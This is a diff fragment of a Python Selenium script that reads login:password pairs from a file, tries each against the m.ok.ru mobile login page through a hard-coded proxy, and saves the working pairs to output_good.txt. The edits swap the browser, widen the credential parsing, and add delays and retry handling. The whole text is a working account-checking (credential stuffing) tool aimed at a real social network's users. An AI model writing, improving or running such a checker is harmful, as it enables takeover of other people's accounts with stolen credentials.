@@ -18,7 +18,7 @@ proxy = '--proxy-server=146.185.200.198:8085'
 
 def auth_test(login, password):
     #init Driver
-    driver = webdriver.Chrome()
+    driver = webdriver.Firefox()
     line = ':'.join([login,password])
     #open site
     base_url = "http://m.ok.ru/"
@@ -47,25 +47,25 @@ def auth_test(login, password):
         output_good = open('output_good.txt', 'a')
         output_good.write(line)
         output_good.close()
-    driver.close()
+    driver.quit()
 
 
 if (__name__=="__main__"):
     input_file = open('input.txt', 'r')
     for line in input_file:
-        login,password = line.split(':')
         try:
+            login,password = line.split(':')
+        except:
+            login,password = line.split(' ')
+        try:
+            time.sleep(5)
             auth_test(login,password)
         except OSError:
             time.sleep(5)
-            try:
-                auth_test(login,password)
-            except OSError:
-                time.sleep(5)
-                print(line)
-                output_good = open('not_checked.txt', 'a')
-                output_good.write(line)
-                output_good.close()
+            print(line)
+            not_checked = open('not_checked.txt', 'a')
+            not_checked.write(line)
+            not_checked.close()
     input_file.close()
 
 
